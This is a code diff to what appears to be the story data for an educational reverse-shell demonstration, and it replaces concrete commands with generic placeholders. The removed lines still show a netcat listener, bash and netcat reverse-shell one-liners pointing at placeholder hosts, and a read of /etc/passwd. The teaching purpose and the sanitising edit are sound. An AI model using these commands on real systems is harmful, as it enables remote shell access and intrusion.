@@ -146,12 +146,12 @@ const stories: Record<string, Story> = {
         title: "Step 1: Attacker Listens",
         terminals: [
           {
-            title: "ATTACKER (Kali Linux)",
+            title: "ATTACKER",
             side: "attacker",
             lines: [
-              { text: "root@kali:~#", type: "prompt" },
-              { text: " nc -lvnp 4444", type: "command" },
-              { text: "listening on [any] 4444 ...", type: "output", delay: 800 }
+              { text: "┌──(attacker)─[~]", type: "prompt" },
+              { text: " listener --port 4444", type: "command" },
+              { text: "[*] Waiting for incoming connection...", type: "output", delay: 800 }
             ]
           }
         ]
@@ -176,40 +176,40 @@ const stories: Record<string, Story> = {
         title: "Step 3: Connection Established!",
         terminals: [
           {
-            title: "ATTACKER (Kali Linux)",
+            title: "ATTACKER",
             side: "attacker",
             lines: [
-              { text: "listening on [any] 4444 ...", type: "output" },
-              { text: "connect to [10.10.14.5] from (UNKNOWN) [10.10.10.100] 52412", type: "success", delay: 500 },
-              { text: "user@server:~$", type: "prompt", delay: 300 },
+              { text: "[*] Waiting for incoming connection...", type: "output" },
+              { text: "[+] Connection received from 10.10.10.100", type: "success", delay: 500 },
+              { text: "[+] Shell session opened!", type: "success", delay: 300 },
+              { text: "", type: "output", delay: 200 },
+              { text: "victim$", type: "prompt", delay: 300 },
               { text: " whoami", type: "command", delay: 200 },
-              { text: "user", type: "output", delay: 400 },
-              { text: "user@server:~$", type: "prompt", delay: 200 },
-              { text: " id", type: "command", delay: 200 },
-              { text: "uid=1000(user) gid=1000(user) groups=1000(user)", type: "output", delay: 400 },
-              { text: "user@server:~$", type: "prompt", delay: 200 },
-              { text: " cat /etc/passwd | head -3", type: "command", delay: 200 },
-              { text: "root:x:0:0:root:/root:/bin/bash", type: "output", delay: 200 },
-              { text: "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", type: "output", delay: 100 },
-              { text: "bin:x:2:2:bin:/bin:/usr/sbin/nologin", type: "output", delay: 100 }
+              { text: "webuser", type: "output", delay: 400 },
+              { text: "victim$", type: "prompt", delay: 200 },
+              { text: " hostname", type: "command", delay: 200 },
+              { text: "prod-server-01", type: "output", delay: 400 },
+              { text: "victim$", type: "prompt", delay: 200 },
+              { text: " pwd", type: "command", delay: 200 },
+              { text: "/var/www/html", type: "output", delay: 300 }
             ]
           }
         ]
       },
       {
         type: "code",
-        title: "Common Reverse Shell Patterns",
+        title: "How Reverse Shells Work",
         lines: [
-          { text: "# Bash (redirects stdin/stdout to TCP)", type: "comment" },
-          { text: "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1", type: "normal" },
+          { text: "// The victim's machine does this:", type: "comment" },
           { text: "", type: "normal" },
-          { text: "# Python (socket + pty module)", type: "comment" },
-          { text: "socket.connect() → dup2() → pty.spawn()", type: "normal" },
+          { text: "1. Open TCP connection TO attacker", type: "normal" },
+          { text: "2. Redirect STDIN  → socket", type: "normal" },
+          { text: "3. Redirect STDOUT → socket", type: "normal" },
+          { text: "4. Redirect STDERR → socket", type: "normal" },
+          { text: "5. Spawn interactive shell", type: "normal" },
           { text: "", type: "normal" },
-          { text: "# Netcat (if -e flag available)", type: "comment" },
-          { text: "nc -e /bin/sh <IP> <PORT>", type: "normal" },
-          { text: "", type: "normal" },
-          { text: "# Educational use only - see OWASP/HackTricks", type: "comment" }
+          { text: "// Result: attacker types, victim executes", type: "comment" },
+          { text: "// See: HackTricks, PayloadsAllTheThings", type: "comment" }
         ]
       },
       {
